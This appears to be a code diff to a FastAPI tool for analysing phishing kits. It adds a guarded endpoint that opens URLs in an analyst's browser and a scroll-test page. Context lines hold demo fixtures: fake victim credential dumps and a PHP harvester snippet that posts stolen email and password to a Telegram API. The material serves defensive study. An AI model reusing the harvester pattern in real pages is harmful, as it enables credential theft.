@@ -153,6 +153,30 @@ async def update_restart(request: Request):
     return {"restarting": True}
 
 
+class OpenReq(BaseModel):
+    url: str
+
+
+@app.post("/api/open-native")
+async def open_native(req: OpenReq, request: Request):
+    """Open a URL in the analyst's REAL default browser on the external SOC box (manual inspection).
+    http/https only; cross-origin-guarded so a stray tab can't pop browser windows."""
+    if _cross_origin(request):
+        return JSONResponse({"error": "cross-origin request blocked"}, status_code=403)
+    url = _norm_url(req.url or "")
+    if not (url.startswith("http://") or url.startswith("https://")):
+        return JSONResponse({"error": "only http/https URLs can be opened"}, status_code=400)
+    try:
+        os.startfile(url)                    # Windows: hand to the default browser
+        return {"ok": True, "url": url}
+    except Exception:
+        try:
+            import webbrowser
+            return {"ok": bool(webbrowser.open(url)), "url": url}
+        except Exception as exc:
+            return JSONResponse({"error": f"{type(exc).__name__}: {exc}"[:120]}, status_code=500)
+
+
 @app.get("/api/artifact")
 async def artifact(path: str):
     """Download a recovered kit artifact — path-traversal guarded to the artifacts dir."""
@@ -255,6 +279,8 @@ class InputEv(BaseModel):
     type: str
     x: float | None = None
     y: float | None = None
+    dx: float | None = None      # scroll deltas — were being stripped, so take-over scrolling did nothing
+    dy: float | None = None
     key: str | None = None
     text: str | None = None
 
@@ -518,6 +544,18 @@ _OD_CREDS = "victim1@corp.com:Passw0rd!\nvictim2@corp.com:Hunter2!\nfinance@corp
 _OD_SRC = "<?php $to=$_POST['email']; $pw=$_POST['pass']; file_get_contents('https://api.telegram.org/...'); ?>"
 _OD_PAGES = {"": _OD_LISTING, "results_x9f.txt": _OD_CREDS, "index.php": _OD_SRC,
              "sub": _OD_SUB, "sub/": _OD_SUB, "sub/panel_dump.log": "admin@kit-panel.com:kitmaster99\n"}
+
+
+_TALL = ("<!doctype html><html><head><title>Tall test page</title></head><body style='margin:0;font-family:sans-serif'>"
+         + "".join(f"<div style='height:220px;background:{'#12233a' if i % 2 else '#1a3350'};color:#fff;"
+                   f"font-size:44px;padding:24px'>Block {i} — scroll test</div>" for i in range(30))
+         + "</body></html>")
+
+
+@app.get("/demo-tall/")
+async def demo_tall():
+    """A ~6600px scrollable page for testing the take-over scroll/interaction forwarding."""
+    return HTMLResponse(_TALL)
 
 
 @app.api_route("/demo-opendir/{page:path}", methods=["GET", "POST"])
